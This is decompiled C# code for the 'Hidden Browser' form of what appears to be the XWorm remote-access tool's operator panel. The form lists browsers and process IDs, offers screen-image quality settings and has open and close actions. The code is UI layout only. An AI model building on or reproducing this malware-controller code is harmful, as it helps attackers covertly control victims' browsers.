namespace XWorm
{
	// Token: 0x02000015 RID: 21
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class HBrowser : global::System.Windows.Forms.Form
	{
		// Token: 0x06000258 RID: 600 RVA: 0x000168F0 File Offset: 0x00014AF0
		[global::System.Diagnostics.DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06000259 RID: 601 RVA: 0x00016940 File Offset: 0x00014B40
		[global::System.Diagnostics.DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::XWorm.HBrowser));
			this.BrowserToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.MicrosoftEdgeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ChromeToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.FireFoxToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.BraveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.ImageList1 = new global::System.Windows.Forms.ImageList(this.components);
			this.StatusStrip1 = new global::System.Windows.Forms.StatusStrip();
			this.ToolStripStatusLabel1 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.ToolStripStatusLabel2 = new global::System.Windows.Forms.ToolStripStatusLabel();
			this.Timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.RefreshToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PictureBox1 = new global::System.Windows.Forms.PictureBox();
			this.Panel2 = new global::System.Windows.Forms.Panel();
			this.Guna2GradientButton5 = new global::Guna.UI2.WinForms.Guna2GradientButton();
			this.Guna2ComboBox1 = new global::Guna.UI2.WinForms.Guna2ComboBox();
			this.Label2 = new global::System.Windows.Forms.Label();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.Label15 = new global::System.Windows.Forms.Label();
			this.Guna2ToggleSwitch2 = new global::Guna.UI2.WinForms.Guna2ToggleSwitch();
			this.Guna2Panel1 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2GradientButton1 = new global::Guna.UI2.WinForms.Guna2GradientButton();
			this.Guna2Panel3 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.Guna2Panel2 = new global::Guna.UI2.WinForms.Guna2Panel();
			this.ListView1 = new global::System.Windows.Forms.ListView();
			this.ColumnHeader3 = new global::System.Windows.Forms.ColumnHeader();
			this.ColumnHeader4 = new global::System.Windows.Forms.ColumnHeader();
			this.Guna2ContextMenuStrip1 = new global::Guna.UI2.WinForms.Guna2ContextMenuStrip();
			this.GetScreenToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CustomOpenToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.CloseToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.StatusStrip1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
			this.Panel2.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Guna2Panel1.SuspendLayout();
			this.Guna2ContextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.BrowserToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.BrowserToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.MicrosoftEdgeToolStripMenuItem,
				this.ChromeToolStripMenuItem,
				this.FireFoxToolStripMenuItem,
				this.BraveToolStripMenuItem
			});
			this.BrowserToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BrowserToolStripMenuItem.Image");
			this.BrowserToolStripMenuItem.Name = "BrowserToolStripMenuItem";
			this.BrowserToolStripMenuItem.Size = new global::System.Drawing.Size(162, 22);
			this.BrowserToolStripMenuItem.Text = "[ Browser ]";
			this.MicrosoftEdgeToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.MicrosoftEdgeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("MicrosoftEdgeToolStripMenuItem.Image");
			this.MicrosoftEdgeToolStripMenuItem.Name = "MicrosoftEdgeToolStripMenuItem";
			this.MicrosoftEdgeToolStripMenuItem.Size = new global::System.Drawing.Size(131, 22);
			this.MicrosoftEdgeToolStripMenuItem.Text = "[ Edge ]";
			this.ChromeToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.ChromeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("ChromeToolStripMenuItem.Image");
			this.ChromeToolStripMenuItem.Name = "ChromeToolStripMenuItem";
			this.ChromeToolStripMenuItem.Size = new global::System.Drawing.Size(131, 22);
			this.ChromeToolStripMenuItem.Text = "[ Chrome ]";
			this.FireFoxToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.FireFoxToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("FireFoxToolStripMenuItem.Image");
			this.FireFoxToolStripMenuItem.Name = "FireFoxToolStripMenuItem";
			this.FireFoxToolStripMenuItem.Size = new global::System.Drawing.Size(131, 22);
			this.FireFoxToolStripMenuItem.Text = "[ FireFox ]";
			this.BraveToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.BraveToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("BraveToolStripMenuItem.Image");
			this.BraveToolStripMenuItem.Name = "BraveToolStripMenuItem";
			this.BraveToolStripMenuItem.Size = new global::System.Drawing.Size(131, 22);
			this.BraveToolStripMenuItem.Text = "[ Brave ]";
			this.ImageList1.ColorDepth = global::System.Windows.Forms.ColorDepth.Depth32Bit;
			this.ImageList1.ImageSize = new global::System.Drawing.Size(20, 20);
			this.ImageList1.TransparentColor = global::System.Drawing.Color.Transparent;
			this.StatusStrip1.BackColor = global::System.Drawing.Color.White;
			this.StatusStrip1.ImageScalingSize = new global::System.Drawing.Size(24, 24);
			this.StatusStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.ToolStripStatusLabel1,
				this.ToolStripStatusLabel2
			});
			this.StatusStrip1.Location = new global::System.Drawing.Point(0, 399);
			this.StatusStrip1.Name = "StatusStrip1";
			this.StatusStrip1.Padding = new global::System.Windows.Forms.Padding(1, 0, 9, 0);
			this.StatusStrip1.Size = new global::System.Drawing.Size(629, 22);
			this.StatusStrip1.TabIndex = 38;
			this.StatusStrip1.Text = "StatusStrip1";
			this.ToolStripStatusLabel1.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
			this.ToolStripStatusLabel1.Size = new global::System.Drawing.Size(71, 17);
			this.ToolStripStatusLabel1.Text = "Browsers [0]";
			this.ToolStripStatusLabel2.ForeColor = global::System.Drawing.Color.Black;
			this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
			this.ToolStripStatusLabel2.Size = new global::System.Drawing.Size(13, 17);
			this.ToolStripStatusLabel2.Text = "..";
			this.Timer1.Enabled = true;
			this.Timer1.Interval = 1000;
			this.RefreshToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.RefreshToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
			this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
			this.RefreshToolStripMenuItem.Size = new global::System.Drawing.Size(162, 22);
			this.RefreshToolStripMenuItem.Text = "[ Refresh ]";
			this.PictureBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.PictureBox1.Location = new global::System.Drawing.Point(0, 59);
			this.PictureBox1.Name = "PictureBox1";
			this.PictureBox1.Size = new global::System.Drawing.Size(448, 340);
			this.PictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			this.PictureBox1.TabIndex = 37;
			this.PictureBox1.TabStop = false;
			this.Panel2.Controls.Add(this.Guna2GradientButton5);
			this.Panel2.Controls.Add(this.Guna2ComboBox1);
			this.Panel2.Controls.Add(this.Label2);
			this.Panel2.Controls.Add(this.Panel1);
			this.Panel2.Controls.Add(this.Guna2Panel1);
			this.Panel2.Controls.Add(this.Guna2Panel3);
			this.Panel2.Controls.Add(this.Guna2Panel2);
			this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Panel2.Location = new global::System.Drawing.Point(0, 0);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new global::System.Drawing.Size(629, 59);
			this.Panel2.TabIndex = 35;
			this.Guna2GradientButton5.BorderRadius = 3;
			this.Guna2GradientButton5.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton5.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton5.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton5.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton5.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2GradientButton5.FillColor2 = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2GradientButton5.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GradientButton5.ForeColor = global::System.Drawing.Color.White;
			this.Guna2GradientButton5.ImageAlign = global::System.Windows.Forms.HorizontalAlignment.Left;
			this.Guna2GradientButton5.ImageSize = new global::System.Drawing.Size(17, 17);
			this.Guna2GradientButton5.Location = new global::System.Drawing.Point(253, 29);
			this.Guna2GradientButton5.Name = "Guna2GradientButton5";
			this.Guna2GradientButton5.Size = new global::System.Drawing.Size(75, 21);
			this.Guna2GradientButton5.TabIndex = 82;
			this.Guna2GradientButton5.Text = "Paste";
			this.Guna2ComboBox1.BackColor = global::System.Drawing.Color.Transparent;
			this.Guna2ComboBox1.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2ComboBox1.BorderRadius = 3;
			this.Guna2ComboBox1.DrawMode = global::System.Windows.Forms.DrawMode.OwnerDrawFixed;
			this.Guna2ComboBox1.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
			this.Guna2ComboBox1.FocusedColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2ComboBox1.FocusedState.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2ComboBox1.Font = new global::System.Drawing.Font("Segoe UI", 8.25f);
			this.Guna2ComboBox1.ForeColor = global::System.Drawing.Color.Black;
			this.Guna2ComboBox1.ItemHeight = 15;
			this.Guna2ComboBox1.Items.AddRange(new object[]
			{
				"10%",
				"20%",
				"30%",
				"40%",
				"50%",
				"60%",
				"70%",
				"80%",
				"90%",
				"100%"
			});
			this.Guna2ComboBox1.Location = new global::System.Drawing.Point(140, 29);
			this.Guna2ComboBox1.Name = "Guna2ComboBox1";
			this.Guna2ComboBox1.Size = new global::System.Drawing.Size(107, 21);
			this.Guna2ComboBox1.TabIndex = 28;
			this.Label2.AutoSize = true;
			this.Label2.ForeColor = global::System.Drawing.Color.Black;
			this.Label2.Location = new global::System.Drawing.Point(86, 33);
			this.Label2.Name = "Label2";
			this.Label2.Size = new global::System.Drawing.Size(48, 13);
			this.Label2.TabIndex = 12;
			this.Label2.Text = "Quality :";
			this.Panel1.Controls.Add(this.Label15);
			this.Panel1.Controls.Add(this.Guna2ToggleSwitch2);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Panel1.Location = new global::System.Drawing.Point(437, 21);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(123, 38);
			this.Panel1.TabIndex = 81;
			this.Label15.AutoSize = true;
			this.Label15.Location = new global::System.Drawing.Point(58, 12);
			this.Label15.Name = "Label15";
			this.Label15.Size = new global::System.Drawing.Size(52, 13);
			this.Label15.TabIndex = 79;
			this.Label15.Text = "[ Resize ]";
			this.Guna2ToggleSwitch2.Checked = true;
			this.Guna2ToggleSwitch2.CheckedState.BorderColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2ToggleSwitch2.CheckedState.FillColor = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2ToggleSwitch2.CheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.Guna2ToggleSwitch2.CheckedState.InnerColor = global::System.Drawing.Color.White;
			this.Guna2ToggleSwitch2.Location = new global::System.Drawing.Point(17, 8);
			this.Guna2ToggleSwitch2.Name = "Guna2ToggleSwitch2";
			this.Guna2ToggleSwitch2.Size = new global::System.Drawing.Size(35, 20);
			this.Guna2ToggleSwitch2.TabIndex = 80;
			this.Guna2ToggleSwitch2.UncheckedState.BorderColor = global::System.Drawing.Color.FromArgb(136, 200, 236);
			this.Guna2ToggleSwitch2.UncheckedState.FillColor = global::System.Drawing.Color.FromArgb(136, 200, 236);
			this.Guna2ToggleSwitch2.UncheckedState.InnerBorderColor = global::System.Drawing.Color.White;
			this.Guna2ToggleSwitch2.UncheckedState.InnerColor = global::System.Drawing.Color.White;
			this.Guna2Panel1.Controls.Add(this.Guna2GradientButton1);
			this.Guna2Panel1.Dock = global::System.Windows.Forms.DockStyle.Top;
			this.Guna2Panel1.Location = new global::System.Drawing.Point(69, 0);
			this.Guna2Panel1.Name = "Guna2Panel1";
			this.Guna2Panel1.Size = new global::System.Drawing.Size(491, 21);
			this.Guna2Panel1.TabIndex = 35;
			this.Guna2GradientButton1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.Guna2GradientButton1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.Guna2GradientButton1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.Guna2GradientButton1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Guna2GradientButton1.FillColor2 = global::System.Drawing.Color.FromArgb(40, 192, 182);
			this.Guna2GradientButton1.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.Guna2GradientButton1.ForeColor = global::System.Drawing.Color.White;
			this.Guna2GradientButton1.Image = global::XWorm.My.Resources.Resources._Stop;
			this.Guna2GradientButton1.ImageAlign = global::System.Windows.Forms.HorizontalAlignment.Left;
			this.Guna2GradientButton1.ImageSize = new global::System.Drawing.Size(15, 15);
			this.Guna2GradientButton1.Location = new global::System.Drawing.Point(0, 0);
			this.Guna2GradientButton1.Name = "Guna2GradientButton1";
			this.Guna2GradientButton1.Size = new global::System.Drawing.Size(491, 21);
			this.Guna2GradientButton1.TabIndex = 34;
			this.Guna2GradientButton1.Text = "OFF";
			this.Guna2Panel3.Dock = global::System.Windows.Forms.DockStyle.Left;
			this.Guna2Panel3.Location = new global::System.Drawing.Point(0, 0);
			this.Guna2Panel3.Name = "Guna2Panel3";
			this.Guna2Panel3.Size = new global::System.Drawing.Size(69, 59);
			this.Guna2Panel3.TabIndex = 37;
			this.Guna2Panel2.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Guna2Panel2.Location = new global::System.Drawing.Point(560, 0);
			this.Guna2Panel2.Name = "Guna2Panel2";
			this.Guna2Panel2.Size = new global::System.Drawing.Size(69, 59);
			this.Guna2Panel2.TabIndex = 36;
			this.ListView1.BackColor = global::System.Drawing.Color.White;
			this.ListView1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.ListView1.Columns.AddRange(new global::System.Windows.Forms.ColumnHeader[]
			{
				this.ColumnHeader3,
				this.ColumnHeader4
			});
			this.ListView1.ContextMenuStrip = this.Guna2ContextMenuStrip1;
			this.ListView1.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.ListView1.Font = new global::System.Drawing.Font("Tahoma", 8f);
			this.ListView1.ForeColor = global::System.Drawing.Color.Black;
			this.ListView1.FullRowSelect = true;
			this.ListView1.HeaderStyle = global::System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
			this.ListView1.HideSelection = false;
			this.ListView1.Location = new global::System.Drawing.Point(448, 59);
			this.ListView1.Name = "ListView1";
			this.ListView1.ShowGroups = false;
			this.ListView1.ShowItemToolTips = true;
			this.ListView1.Size = new global::System.Drawing.Size(181, 340);
			this.ListView1.SmallImageList = this.ImageList1;
			this.ListView1.Sorting = global::System.Windows.Forms.SortOrder.Ascending;
			this.ListView1.TabIndex = 36;
			this.ListView1.UseCompatibleStateImageBehavior = false;
			this.ListView1.View = global::System.Windows.Forms.View.Details;
			this.ColumnHeader3.Text = "[ Browser ]";
			this.ColumnHeader3.Width = 85;
			this.ColumnHeader4.Text = "[ PID ]";
			this.Guna2ContextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.GetScreenToolStripMenuItem,
				this.RefreshToolStripMenuItem,
				this.BrowserToolStripMenuItem,
				this.CustomOpenToolStripMenuItem1,
				this.CloseToolStripMenuItem
			});
			this.Guna2ContextMenuStrip1.Name = "Guna2ContextMenuStrip2";
			this.Guna2ContextMenuStrip1.RenderStyle.ArrowColor = global::System.Drawing.Color.FromArgb(151, 143, 255);
			this.Guna2ContextMenuStrip1.RenderStyle.BorderColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			this.Guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = global::System.Drawing.Color.FromArgb(113, 74, 250);
			this.Guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = global::System.Drawing.Color.White;
			this.Guna2ContextMenuStrip1.RenderStyle.SeparatorColor = global::System.Drawing.Color.Gainsboro;
			this.Guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = global::System.Drawing.Text.TextRenderingHint.ClearTypeGridFit;
			this.Guna2ContextMenuStrip1.Size = new global::System.Drawing.Size(163, 114);
			this.GetScreenToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.GetScreenToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("GetScreenToolStripMenuItem.Image");
			this.GetScreenToolStripMenuItem.Name = "GetScreenToolStripMenuItem";
			this.GetScreenToolStripMenuItem.Size = new global::System.Drawing.Size(162, 22);
			this.GetScreenToolStripMenuItem.Text = "[ Get Image ]";
			this.CustomOpenToolStripMenuItem1.BackColor = global::System.Drawing.Color.White;
			this.CustomOpenToolStripMenuItem1.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CustomOpenToolStripMenuItem1.Image");
			this.CustomOpenToolStripMenuItem1.Name = "CustomOpenToolStripMenuItem1";
			this.CustomOpenToolStripMenuItem1.Size = new global::System.Drawing.Size(162, 22);
			this.CustomOpenToolStripMenuItem1.Text = "[ Custom Open ]";
			this.CloseToolStripMenuItem.BackColor = global::System.Drawing.Color.White;
			this.CloseToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("CloseToolStripMenuItem.Image");
			this.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem";
			this.CloseToolStripMenuItem.Size = new global::System.Drawing.Size(162, 22);
			this.CloseToolStripMenuItem.Text = "[ Close ]";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(629, 421);
			base.Controls.Add(this.PictureBox1);
			base.Controls.Add(this.ListView1);
			base.Controls.Add(this.StatusStrip1);
			base.Controls.Add(this.Panel2);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			this.MinimumSize = new global::System.Drawing.Size(645, 460);
			base.Name = "HBrowser";
			this.Text = "Hidden Browser";
			this.StatusStrip1.ResumeLayout(false);
			this.StatusStrip1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
			this.Panel2.ResumeLayout(false);
			this.Panel2.PerformLayout();
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.Guna2Panel1.ResumeLayout(false);
			this.Guna2ContextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x040000F7 RID: 247
		private global::System.ComponentModel.IContainer components;
	}
}
